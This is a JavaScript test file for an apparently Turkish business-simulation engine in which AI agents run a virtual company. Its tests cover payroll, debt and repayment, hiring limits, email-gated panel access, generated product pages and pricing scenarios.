  const options = { fetchImpl: () => { throw new Error("no ai"); } };
  let engine = createEngine({ ...base, ...options, databasePath });
  await engine.run({ key: "shrink-1" });
  await engine.close();
  const db = new DatabaseSync(databasePath);
  const snapshot = JSON.parse(
    db.prepare("SELECT data FROM snapshots WHERE id=1").get().data,
  );
  snapshot.company.cash = 400000;
  snapshot.company.reputation = 70;
  snapshot.company.day = 4;
  db.prepare("UPDATE snapshots SET data=? WHERE id=1").run(JSON.stringify(snapshot));
  db.close();
  engine = createEngine({ ...base, ...options, databasePath });
  await engine.run({ key: "shrink-2" });
  const hired = engine.state();
  assert.equal(hired.agents.length, 9, "önce işe alım olmalı");
  const db2 = new DatabaseSync(databasePath);
  const broke = JSON.parse(
    db2.prepare("SELECT data FROM snapshots WHERE id=1").get().data,
  );
  broke.company.cash = 900; // bordronun altına düşen kasa
  db2.prepare("UPDATE snapshots SET data=? WHERE id=1").run(JSON.stringify(broke));
  db2.close();
  await engine.close();
  const engine3 = engineFor(t, { ...options, databasePath });
  await engine3.run({ key: "shrink-3" });
  const after = engine3.state();
  assert.equal(after.agents.length, 8, "kasa dayanmayınca kadro daralmalı");
  assert.equal(after.agents.every((a) => a.founder), true);
  assert.equal(after.company.headcount, 8);
  assert.equal(after.company.payroll, payrollOf(after.agents));
  assert.ok(after.hiring.departures >= 1);
  assert.ok(after.events.some((e) => e.type === "departure"));
});

test("an empty till turns into debt, and a full till pays it back", async (t) => {
  let clock = new Date("2026-09-14T10:00:00Z");
  const dir = await mkdtemp(join(tmpdir(), "mesai-debt-"));
  t.after(() => rm(dir, { recursive: true, force: true }));
  const databasePath = join(dir, "debt.db");
  const engine = engineFor(t, {
    databasePath,
    clock: () => clock,
    bootstrap: true,
  });
  await engine.ready;
  const db = new DatabaseSync(databasePath);
  const load = () =>
    JSON.parse(db.prepare("SELECT data FROM snapshots WHERE id=1").get().data);
  const store = (state) =>
    db
      .prepare("UPDATE snapshots SET data=? WHERE id=1")
      .run(JSON.stringify(state));

  // the company is nearly broke before the next shift
  const broke = load();
  broke.company.cash = 200;
  store(broke);
  clock = new Date("2026-09-15T10:00:00Z");
  await engine.run({ key: "debt-day", kind: "manual" });
  const borrowed = engine.state();
  assert.ok(borrowed.finance.debt > 0, "kasa bitince kredi kullanılmalı");
  assert.ok(borrowed.company.cash >= 0, "kredi kasayı ayağa kaldırmalı");
  assert.ok(borrowed.finance.loans.length > 0);
  assert.ok(
    borrowed.events.some((e) => e.type === "debt"),
    "borçlanma akışta görünmeli",
  );
  assert.ok(borrowed.finance.debt <= borrowed.finance.creditLimit);

  // a healthy till pays the loan down again
  const rich = load();
  rich.company.cash = 400000;
  store(rich);
  clock = new Date("2026-09-16T10:00:00Z");
  await engine.run({ key: "repay-day", kind: "manual" });
  const repaid = engine.state();
  assert.equal(repaid.finance.debt, 0, "nakit varken borç kapanmalı");
  assert.ok(repaid.finance.repaid > 0);
  db.close();
});

test("the credit limit grows with recurring revenue and reputation", () => {
  const small = creditLimitOf({ recurring: 0, reputation: 50 });
  const bigger = creditLimitOf({ recurring: 900, reputation: 50 });
  const trusted = creditLimitOf({ recurring: 900, reputation: 80 });
  assert.ok(bigger > small);
  assert.ok(trusted > bigger);
});

test("no one is hired while the company is carrying heavy debt", () => {
  const state = migrate({
    company: {
      cash: 400000,
      reputation: 80,
      recurring: 900,
      customers: 5,
      day: 9,
    },
    agents: PERSONAS.map((p) => ({ ...p })),
    hiring: { hired: [], lastHireDay: 0, postings: 0, raises: 0 },
  });
  state.finance.creditLimit = creditLimitOf(state.company);
  state.finance.debt = 0;
  assert.ok(nextHire(state, 9), "borçsuzken işe alım açık");
  state.finance.debt = state.finance.creditLimit;
  assert.equal(nextHire(state, 9), null, "ağır borçta işe alım durur");
});

test("the panel costs one e-mail address, and the founder can see who came in", async (t) => {
  const engine = engineFor(t, { databasePath: ":memory:" });
  assert.equal((await engine.grantAccess({ email: "not-an-email" })).error, "invalid");
  const first = await engine.grantAccess({ email: "Okur@Example.com " });
  assert.equal(first.email, "okur@example.com");
  assert.equal(first.returning, false);
  assert.ok(first.token.length > 20);
  // the same address keeps its token and counts as a return visit
  const again = await engine.grantAccess({ email: "okur@example.com" });
  assert.equal(again.token, first.token);
  assert.equal(again.returning, true);
  assert.equal(engine.touchAccess(first.token).ok, true);
  assert.equal(engine.touchAccess("bilinmeyen").ok, false);
  const list = engine.accessList();
  assert.equal(list.length, 1);
  assert.equal(list[0].email, "okur@example.com");
  assert.equal(list[0].visits, 3);
  assert.equal(list[0].subscribed, false);
  assert.equal(engine.accessCount(), 1);
  assert.equal(engine.state().community.watchers, 1);
  // asking for the newsletter is a separate, explicit choice
  await engine.grantAccess({ email: "abone@example.com", subscribe: true });
  const rows = engine.accessList();
  assert.equal(rows.length, 2);
  assert.equal(rows.find((r) => r.email === "abone@example.com").subscribed, true);
  assert.equal(rows.find((r) => r.email === "okur@example.com").subscribed, false);
});

test("the product page teaser hides what the panel shows", async (t) => {
  const engine = engineFor(t, { databasePath: ":memory:" });
  const teaser = engine.publicState();
  assert.ok(teaser.company.day >= 0);
  assert.ok(teaser.agents.length > 0);
  for (const key of ["decisions", "events", "tasks", "ledger", "finance", "config"])
    assert.equal(teaser[key], undefined, `${key} sızmamalı`);
  assert.equal(teaser.agents[0].memories, undefined);
  assert.equal(typeof teaser.artifactCount, "number");
  assert.equal(typeof teaser.memoryCount, "number");
  const granted = await engine.grantAccess({ email: "kapi@example.com" });
  assert.equal(engine.hasAccess(granted.token), true);
  assert.equal(engine.hasAccess("uydurma"), false);
  assert.equal(engine.hasAccess(""), false);
});

test("a winning line becomes a live product page the company wrote itself", async (t) => {
  const dir = await mkdtemp(join(tmpdir(), "mesai-launch-"));
  t.after(() => rm(dir, { recursive: true, force: true }));
  const engine = engineFor(t, {
    databasePath: join(dir, "launch.db"),
    bootstrap: true,
  });
  await engine.ready;
  const state = engine.state();
  const live = (state.products || []).filter((p) => p.status === "active");
  const sites = engine.siteList();
  if (live.length) {
    assert.ok(sites.length > 0, "kazanan hat için sayfa açılmalı");
    const page = engine.site(sites[0].slug);
    assert.ok(page, "sayfa yayında olmalı");
    assert.match(page.html, /<!doctype html>/i);
    assert.doesNotMatch(page.html, /<script/i, "sayfada script olmamalı");
    assert.match(page.html, /simülasyon/i, "sınır uyarısı sayfada kalmalı");
    assert.ok(state.sites.some((x) => x.slug === sites[0].slug));
    assert.ok(
      engine.postFeed().some((p) => p.kind === "launch"),
      "lansman gönderisi yazılmalı",
    );
  }
  // every shift leaves a note in the company's own feed
  const feed = engine.postFeed();
  assert.ok(feed.length > 0);
  assert.ok(feed.some((p) => p.kind === "daily"));
  assert.ok(feed[0].author && feed[0].day >= 1);
  // the teaser carries the marketing surface too
  const teaser = engine.publicState();
  assert.ok(Array.isArray(teaser.sites));
  assert.ok(Array.isArray(teaser.posts));
});

test("product slugs are url safe and the page carries the company's own words", () => {
  assert.equal(slugify("Şarj İstasyonu Fizibilitesi", 4), "sarj-istasyonu-fizibilitesi-4");
  assert.equal(slugify("", 2), "urun-2");
  const html = makeProductPage({
    product: { id: "x", title: "Test Ürünü", field: "Enerji", customers: 3, price: 4000 },
    strategy: { segment: "KOBİ", price: 4000 },
    copy: {
      tagline: "Tek cümlelik anlatım",
      problem: "Sorun",
      how: "Nasıl",
      audience: "Kim",
      steps: ["a", "b"],
      benefits: [{ title: "Fayda", text: "Metin" }],
    },
    company: { name: "MESAI Labs" },
    day: 5,
    site: "https://mesailabs.com/u/test-urunu-5",
  });
  assert.match(html, /Test Ürünü/);
  assert.match(html, /Tek cümlelik anlatım/);
  assert.match(html, /5\. mesaide/);
  assert.doesNotMatch(html, /<script/i);
});

test("the team prices the pilot, and the market answers the price", () => {
  const strategy = STRATEGIES[0];
  const scenarios = priceScenarios(strategy);
  assert.equal(scenarios.length, 3);
  assert.ok(scenarios[0].price < scenarios[1].price);
  assert.ok(scenarios[1].price < scenarios[2].price);
  // Cheaper converts better, dearer converts worse.
  assert.ok(scenarios[0].factor > scenarios[1].factor);
  assert.ok(scenarios[1].factor > scenarios[2].factor);
  assert.equal(scenarios[1].factor, 1);

  const rich = { strategy, cash: 25000, payroll: 1000, day: 1 };
  assert.equal(choosePrice(rich).chosen.id, "referans");
  assert.equal(choosePrice({ ...rich, cash: 2000 }).chosen.id, "temkinli");
  assert.equal(
    choosePrice({ ...rich, learning: { failures: 2, successes: 0 }, day: 5 })
      .chosen.id,
    "temkinli",
  );
  assert.equal(
    choosePrice({ ...rich, learning: { failures: 0, successes: 2 }, day: 5 })
      .chosen.id,
    "iddiali",
  );

  // A lower price wins more pilots than a higher one over the same seeds.
  const run = (price) =>
    Array.from({ length: 300 }, (_, i) =>
      simulateMarket({
        strategy,
        budget: strategy.cost,
        day: 3,
        seed: `price-${i}`,
        price,
      }),
    );
  const cheap = run(scenarios[0].price).filter((r) => r.success).length;
  const dear = run(scenarios[2].price).filter((r) => r.success).length;
  assert.ok(cheap > dear);

  for (const result of run(scenarios[0].price)) {
    assert.equal(result.price, scenarios[0].price);
    assert.equal(result.revenue, result.customers * scenarios[0].price);
    assert.equal(result.buyers.length, result.customers);
    // Nobody buys twice from the same district or in the same trade.
    assert.equal(
      new Set(result.buyers.map((b) => b.place)).size,
      result.buyers.length,
    );
    assert.equal(
      new Set(result.buyers.map((b) => b.kind)).size,
      result.buyers.length,
    );
    for (const buyer of result.buyers) {
      assert.ok(buyer.size >= 20 && buyer.size <= 150);
      assert.ok(buyer.role.length > 3);
      assert.ok(buyer.label.includes(String(buyer.size)));
      assert.equal(buyer.price, scenarios[0].price);
    }
  }
});

test("a business line the team invents brings its own buyers", () => {
  const invented = validateNewStrategy({
    title: "Zincir kuru temizlemede buhar kaçağı",
    segment: "Şubeli kuru temizlemeciler",
    problem: "Buhar hattındaki kaçakların faturaya sessizce yansıması",
    solution: "Şube başına kaçak taraması ve haftalık tüketim çizelgesi",
    hypothesis: "Şube müdürü ölçülebilir bir tarama için görüşme kabul eder.",
    field: "Buhar hattı verimliliği",
    price: 3000,
    cost: 1000,
    buyers: {
      kinds: ["Kuru Temizleme Şubesi", "otel çamaşırhanesi", "hastane çamaşırhanesi", "tekstil yıkama tesisi"],
      roles: ["şube müdürü", "teknik sorumlu"],
      sizes: [6, 60],
    },
  });
  assert.ok(invented);
  // Normalised: lower-cased, de-duplicated, bounded.
  assert.equal(invented.buyers.kinds[0], "kuru temizleme şubesi");
  assert.equal(invented.buyers.sizes[0], 6);
  assert.ok(invented.buyers.sizes[1] > invented.buyers.sizes[0]);

  const buyers = describeCustomers({
    strategy: invented,
    count: 2,
    seed: "invented-line",
    price: 3000,
  });
  assert.equal(buyers.length, 2);
  for (const buyer of buyers) {
    assert.ok(invented.buyers.kinds.includes(buyer.kind));
    assert.ok(invented.buyers.roles.includes(buyer.role));
    assert.ok(buyer.size >= 6 && buyer.size <= 60);
  }

  // Too thin a list is refused, and the line simply falls back to the pool.
  assert.equal(normalizeBuyers({ kinds: ["a"], roles: [] }), null);
  assert.equal(normalizeBuyers(null), null);
  const bare = validateNewStrategy({
    title: "Alıcısı tarif edilmemiş fikir",
    segment: "Belirsiz",
    problem: "Tarif edilmemiş bir sorun",
    solution: "Küçük kapsamlı bir teslim",
    hypothesis: "Denenebilir bir varsayım",
  });
  assert.equal(bare.buyers, null);
  assert.ok(describeCustomers({ strategy: bare, count: 1, seed: "x" }).length === 1);
});

test("the scorecard scores the price the team actually chose", () => {
  const strategy = STRATEGIES[0];
  const scenarios = priceScenarios(strategy);
  const inputs = {
    strategy,
    budget: strategy.cost,
    day: 4,
    reputation: 50,
    morale: 78,
    learning: {},
    scenarios,
  };
  let hits = 0,
    misses = 0;
  for (let i = 0; i < 120; i++) {
    const seed = `score-${i}`;
    const chosenId = scenarios[i % 3].id;
    const audit = scorePricing({ ...inputs, seed, chosenId });
    assert.equal(audit.trials.length, 3);
    assert.equal(audit.chosen, chosenId);
    // The audit must agree with a plain run of the same seed and price.
    const direct = simulateMarket({
      ...inputs,
      seed,
      price: scenarios[i % 3].price,
      scenario: chosenId,
    });
    const trial = audit.trials.find((t) => t.id === chosenId);
    assert.equal(trial.revenue, direct.revenue);
    assert.equal(trial.customers, direct.customers);
    // A hit means nothing was left on the table; a miss quantifies what was.
    const bestRevenue = Math.max(...audit.trials.map((t) => t.revenue));
    assert.equal(audit.hit, trial.revenue >= bestRevenue);
    assert.equal(audit.gap, audit.hit ? 0 : bestRevenue - trial.revenue);
    audit.hit ? hits++ : misses++;
  }
  // Over many seeds the CFO is neither always right nor always wrong.
  assert.ok(hits > 0);
  assert.ok(misses > 0);
  assert.equal(scorePricing({ ...inputs, seed: "x", scenarios: [] }), null);
});
